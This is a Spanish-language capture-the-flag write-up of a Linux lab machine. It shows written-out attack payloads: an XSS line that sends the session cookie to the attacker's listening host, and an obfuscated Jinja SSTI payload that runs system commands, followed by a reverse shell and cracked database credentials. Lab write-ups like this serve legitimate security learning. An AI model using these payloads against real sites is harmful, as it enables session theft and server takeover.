#Linux #medium #tecnicas 
### Ping
```python
ping -c 1 10.10.11.12
PING 10.10.11.12 (10.10.11.12) 56(84) bytes of data.
64 bytes from 10.10.11.12: icmp_seq=1 ttl=63 time=71.4 ms

--- 10.10.11.12 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 71.439/71.439/71.439/0.000 ms
```

### TTL 63 = Linux

### nmap
```python
sudo nmap -p- --open -sC -sV --min-rate 5000 -Pn 10.10.11.12 -oN Scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 22:36 EDT
Nmap scan report for 10.10.11.12
Host is up (0.071s latency).
Not shown: 65506 closed tcp ports (reset), 27 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.78 seconds
```

### Enumeración del puerto 80 (http)

![[Pasted image 20240408224546.png]]

![[Pasted image 20240408224608.png]]

### Fuzzing con ffuz
el dominio `/quote` no esta en los directorios de la pagina asi que vamos a investigar  
![[Pasted image 20240408224309.png]]

`quote`
![[Pasted image 20240408224935.png]]

### BurpSuite
vamos a realizar una petición y la interceptamos con burpsuite
![[Pasted image 20240408225150.png]]

`Service`
tenemos 3 service que se estan enviando al servidor. vamos a intentar validarlos enviando una petición a un servidor que tendremos a la escucha
```python
<img+src='http://10.10.14.27/test.png'>
```
![[Pasted image 20240408231842.png]]

### Python3 server
obtenemos la petición que hemos realizado por lo cual podemos decir que esta web es vulnerable a `XSS`
![[Pasted image 20240408232124.png]]

### Cookie
vamos a usar este payload para capturar la cookie de session. 
```python
<img src=x onerror=this.src='http://10.10.14.27/?c='+document.cookie> # URLencode
```
![[Pasted image 20240408234641.png]]

`cookie`
![[Pasted image 20240408234800.png]]

agregamos la cookie en el `cookie-editor`
![[cookie.png]]

### dashboad

![[Pasted image 20240408235954.png]]

`Generate Invoice`
![[Pasted image 20240408235845.png]]

`codigo ID 0255314324`
obtenemos un ID Invoice 
![[Pasted image 20240408235903.png]]

`Generator QR`
ingresamos el ID que hemos obtenido anteriormente
![[Pasted image 20240409000254.png]]

### SSTI (Server-Side Template Injection)
realizamos una prueba y es posible ver el resultado dentro del nombre de archivo generado para el código QR. Eso confirma que se está produciendo SSTI
![[Pasted image 20240409001851.png]]

`Burpsuite`
interceptamos la petición con burpsuite y podemos confirmar que se esta ejecutando correctamente el resultado de {{7 * 7}} a partir de aqui solo necesitamos conseguir hacer Bypass para poder ejecutar codigo
![[Pasted image 20240409002315.png]]

### Bypass SSTI 
usando estos parametros podemos hacer un bypass del servicio que esta corriendo por detras el cual hemos logrado ejecutar con éxito el comando id usaremos esto para ejecutar una reverse shell
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
![[Pasted image 20240409003615.png]]

### reverse shell
usamos una reverse shell u la URL encodeamos 
![[Pasted image 20240409004321.png]]

### Netcat 
estaremos a la escucha con Netcat por el puerto que hemos especificado y obtenemos la shell
![[Pasted image 20240409004434.png]]

`www-data`

![[Pasted image 20240409011025.png]]
### database
podemos ver las credenciales de usuario
![[Pasted image 20240409005450.png]]

### mysql
podemos listar la base de datos
![[Pasted image 20240409010111.png]]

`mysql`
listando la tabla de usuarios podemos listar credenciales en texto plano
![[Pasted image 20240409010333.png]]

### Crackstation
tenemos la contraseña de consuela
![[Pasted image 20240409010748.png]]

### ssh
tenemos conexión via ssh
![[Pasted image 20240409010946.png]]

### Escalada de privilegios
con un poco de pensamiento lateral podemos leer la root sin escalar privilegios
![[Pasted image 20240409011222.png]]

con este comando vamos a agregar el archivo `root.txt` como un attachment al archivo pdf que ya existe en la maquina y luego lo descargamos para analizarlo en local
![[Pasted image 20240409011943.png]]

### pdfdetach 
de esta manera podemos extraer los archivos que se han agregado al pdf 
![[Pasted image 20240409014202.png]]